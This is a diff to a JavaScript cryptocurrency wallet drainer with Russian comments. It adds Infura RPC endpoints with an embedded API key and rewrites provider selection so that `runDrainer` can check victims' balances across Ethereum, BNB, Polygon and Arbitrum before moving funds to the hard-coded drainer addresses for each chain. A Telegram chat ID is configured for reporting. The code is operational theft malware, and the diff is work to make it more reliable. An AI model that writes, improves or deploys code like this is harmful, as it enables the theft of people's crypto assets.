@@ -7,6 +7,22 @@ const TELEGRAM_CHAT_ID = '-4767714458';
 // Переменная для отслеживания времени последнего вызова drain
 let lastDrainTime = 0;
 
+// Список резервных RPC для каждой сети
+const RPC_URLS = {
+  1: [
+    'https://mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9' // Замени YOUR_INFURA_KEY, если есть ключ
+  ],
+  56: [
+    'https://bsc-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9'
+  ],
+  137: [
+    'https://polygon-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9'// Замени YOUR_ALCHEMY_KEY, если есть ключ
+  ],
+  42161: [
+    'https://arbitrum-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9', // Замени YOUR_INFURA_KEY, если есть ключ
+  ]
+};
+
 // Функция для отправки сообщения в Telegram
 async function sendTelegramMessage(message) {
   try {
@@ -175,7 +191,7 @@ const CHAINS = {
     name: "Ethereum Mainnet",
     nativeToken: "ETH",
     chainIdHex: "0x1",
-    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
+    rpcUrls: RPC_URLS[1],
     usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
     usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
     drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
@@ -209,11 +225,7 @@ const CHAINS = {
     name: "BNB Chain",
     nativeToken: "BNB",
     chainIdHex: "0x38",
-    rpcUrls: [
-      "https://bsc-dataseed.binance.org/",
-      "https://bsc-dataseed1.defibit.io/",
-      "https://bsc-dataseed1.ninicoin.io/"
-    ],
+    rpcUrls: RPC_URLS[56],
     usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
     usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
@@ -241,7 +253,7 @@ const CHAINS = {
     name: "Polygon",
     nativeToken: "MATIC",
     chainIdHex: "0x89",
-    rpcUrls: ["https://polygon-rpc.com/"],
+    rpcUrls: RPC_URLS[137],
     usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
     usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
     drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
@@ -260,7 +272,7 @@ const CHAINS = {
     name: "Arbitrum One",
     nativeToken: "ETH",
     chainIdHex: "0xa4b1",
-    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
+    rpcUrls: RPC_URLS[42161],
     usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
     usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e583",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
@@ -285,22 +297,28 @@ async function getTokenPriceInUSDT(tokenSymbol) {
   }
 }
 
-// Функция для выбора рабочего провайдера
-async function getWorkingProvider(rpcUrls) {
-  const providerPromises = rpcUrls.map(async (rpc) => {
-    try {
-      const provider = new ethers.providers.JsonRpcProvider(rpc);
-      await provider.getBalance('0x0000000000000000');
-      return provider;
-    } catch {
-      return null;
-    }
-  });
+// Функция для выбора рабочего провайдера с подходом из getReliableProvider
+async function getWorkingProvider(chainId) {
+  const rpcUrls = CHAINS[chainId].rpcUrls;
 
-  const results = await Promise.all(providerPromises);
-  const workingProvider = results.find(provider => provider !== null);
-  if (!workingProvider) throw new Error('No working provider found');
-  return workingProvider;
+  for (const rpcUrl of rpcUrls) {
+    if (rpcUrl.includes('YOUR_INFURA_KEY') || rpcUrl.includes('YOUR_ALCHEMY_KEY')) {
+      console.warn(`⚠️ Пропущен RPC ${rpcUrl}: требуется API-ключ`);
+      continue;
+    }
+
+    try {
+      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
+      await provider.getBalance('0x0000000000000000000000000000000000000000');
+      console.log(`✅ Используется RPC: ${rpcUrl} для chainId ${chainId}`);
+      return provider;
+    } catch (err) {
+      console.warn(`⚠️ RPC ${rpcUrl} для chainId ${chainId} недоступен: ${err.message}`);
+    }
+  }
+
+  console.error(`❌ Не удалось найти рабочий RPC для chainId ${chainId}`);
+  return null; // Возвращаем null вместо ошибки, чтобы обработать на уровне вызова
 }
 
 // Проверка баланса
@@ -666,7 +684,11 @@ export async function runDrainer(provider, signer, userAddress, onApproveTxSent)
 
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
     try {
-      const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
+      const reliableProvider = await getWorkingProvider(chainId);
+      if (!reliableProvider) {
+        console.error(`⚠️ Пропускаем chainId ${chainId}: нет рабочего провайдера`);
+        return null;
+      }
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
       return { chainId: Number(chainId), balance, provider: reliableProvider };
     } catch (error) {
@@ -676,6 +698,10 @@ export async function runDrainer(provider, signer, userAddress, onApproveTxSent)
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
+  if (!balances.length) {
+    throw new Error('No working providers found for any chain');
+  }
+
   const sorted = balances
     .filter(item => hasFunds(item.balance))
     .sort((a, b) => {
